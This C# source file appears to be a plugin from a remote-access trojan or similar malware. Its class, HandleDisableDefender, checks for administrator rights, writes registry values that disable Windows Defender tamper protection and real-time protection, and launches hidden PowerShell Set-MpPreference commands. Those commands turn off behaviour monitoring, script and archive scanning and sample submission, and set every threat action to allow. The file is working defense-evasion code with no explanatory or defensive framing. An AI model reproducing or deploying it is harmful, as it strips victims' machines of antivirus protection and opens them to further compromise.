using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Plugin.Handler
{
    class HandleDisableDefender
    {
        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); 
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); 

                else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); 

                else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); 

                else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); 

                else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); 

                else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); 

                else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); 

                else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); 

                else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); 

                else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); 

                else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); 

                else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); 

                else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); 

                else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); 
            }
        }

        private void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

    }
}
